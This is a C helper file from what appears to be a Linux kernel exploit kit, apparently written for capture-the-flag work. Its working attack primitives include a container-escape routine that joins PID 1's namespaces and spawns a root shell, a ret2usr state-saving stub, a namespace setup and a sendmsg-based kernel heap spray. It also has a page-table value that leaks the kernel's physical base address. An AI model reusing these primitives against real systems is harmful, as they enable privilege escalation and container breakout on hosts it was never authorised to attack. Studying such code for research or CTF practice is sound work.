#define _GNU_SOURCE
#include "util.h"
#include <fcntl.h>
#include <pthread.h>
#include <stdarg.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <unistd.h>

bool is_kernel_ptr(uint64_t val) {
    return (val & KERNEL_MASK) == KERNEL_MASK && val != 0xffffffffffffffff;
}

bool is_heap_ptr(uint64_t val) {
    return (val & HEAP_MASK) == HEAP_MASK &&
           (val & KERNEL_MASK) != KERNEL_MASK && val != 0xffffffffffffffff;
}

void info(const char *format, ...) {
    va_list args;
    va_start(args, format);

    printf("[+] ");
    vprintf(format, args);

    va_end(args);
}

void error(const char *format, ...) {
    va_list args;
    va_start(args, format);

    printf("[x] ");
    vprintf(format, args);

    va_end(args);
}

void hexdump(void *buf, size_t len) {
    uint64_t *tmp = (uint64_t *)buf;

    for (int i = 0; i < (len / 8); i++) {
        printf("%d: %p ", i, tmp[i]);
        if ((i + 1) % 2 == 0) {
            printf("\n");
        }
    }

    printf("\n");
}

void get_shell_docker(void) {
    puts("Got r00t :)");
    // spin the parent
    // if(fork()){ for(;;); }
    // move to safe cpu
    // to prevent access to corrupted freelist
    assign_to_core(1);
    sleep(1);

    // escape pid/mount/network namespace
    setns(open("/proc/1/ns/mnt", O_RDONLY), 0);
    setns(open("/proc/1/ns/pid", O_RDONLY), 0);
    setns(open("/proc/1/ns/net", O_RDONLY), 0);

    // drop root shell
    execlp("/bin/bash", "/bin/bash", NULL);
    exit(0);
}

static void get_shell(void) {
    if (!getuid()) {
        puts("Got r00t :)");
        execlp("/bin/bash", "/bin/bash", NULL);
    }
    exit(0);
}

uint64_t user_cs, user_ss, user_sp, user_rflags;
void save_state(void) {
    __asm__(".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax;");
}

void assign_thread_to_core(int core_id) {
    cpu_set_t mask;

    CPU_ZERO(&mask);
    CPU_SET(core_id, &mask);

    if (pthread_setaffinity_np(pthread_self(), sizeof(mask), &mask) < 0) {
        errExit("[X] assign_thread_to_core_range()");
    }
}

void assign_to_core(int core_id) {
    cpu_set_t mask;

    CPU_ZERO(&mask);
    CPU_SET(core_id, &mask);

    if (sched_setaffinity(getpid(), sizeof(mask), &mask) < 0) {
        errExit("[X] sched_setaffinity()");
    }
}

int ulimit_fd(void) {
    struct rlimit rlim;

    // Get the current resource limits
    if (getrlimit(RLIMIT_NOFILE, &rlim) == -1) {
        perror("getrlimit");
        return 1;
    }

    // printf("Current maximum file descriptors limit: %ld\n", rlim.rlim_cur);

    // Increase the maximum file descriptors limit
    rlim.rlim_cur = rlim.rlim_max;
    if (setrlimit(RLIMIT_NOFILE, &rlim) == -1) {
        perror("setrlimit");
        return 1;
    }

    // Get the updated resource limits
    if (getrlimit(RLIMIT_NOFILE, &rlim) == -1) {
        perror("getrlimit");
        return 1;
    }

    printf("New maximum file descriptors limit: %ld\n", rlim.rlim_cur);

    return 0;
}

void unshare_setup(uid_t uid, gid_t gid) {
    int temp;
    char edit[0x100];

    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);

    temp = open("/proc/self/setgroups", O_WRONLY);
    write(temp, "deny", strlen("deny"));
    close(temp);

    temp = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", uid);
    write(temp, edit, strlen(edit));
    close(temp);

    temp = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", gid);
    write(temp, edit, strlen(edit));
    close(temp);

    return;
}

void print_regs(pt_regs_t *regs) {
    printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14,
           regs->r13, regs->r12);
    printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11,
           regs->r10);
    printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax,
           regs->cx);
    printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di,
           regs->ip);
    printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags,
           regs->sp, regs->ss);
}

// https://u1f383.github.io/android/2025/09/08/corCTF-2025-corphone.html
// PTE entry, which when read leaks the physical address from the __brk_base
// symbol in kernel data segment. => Can then be used to calculate the physical
// base address of the kernel
uint64_t stext_phys_leak_pte() { return 0x9c000 | 0x8000000000000067; }

// Spray based on sock_kmalloc:
//
// Triggers at most one temporary sock_kmalloc() for msg_control in
// ____sys_sendmsg() when msg_controllen exceeds the small on-stack buffer (36
// bytes).
//
// The buffer is always freed before the syscall returns, so this is not
// a persistent spray.
//
// allocation happens here:
// https://github.com/torvalds/linux/blob/80234b5ab240f52fa45d201e899e207b9265ef91/net/socket.c#L2564
static int g_sockfd[2] = {-1, -1};
void spray_unix_control(void *data, size_t len) {
    if (g_sockfd[0] == -1 || g_sockfd[1] == -1) {
        if (socketpair(AF_UNIX, SOCK_DGRAM, 0, g_sockfd) < 0) {
            errExit("socketpair");
        }
    }
    char payload = 'A';
    struct iovec iov = {.iov_base = &payload, .iov_len = sizeof(payload)};
    struct msghdr msg = {
        .msg_iov = &iov,
        .msg_iovlen = 1,
        .msg_control = data,
        .msg_controllen = len,
    };

    if (sendmsg(g_sockfd[1], &msg, 0) < 0) {
        // perror("sendmsg");
    }
}
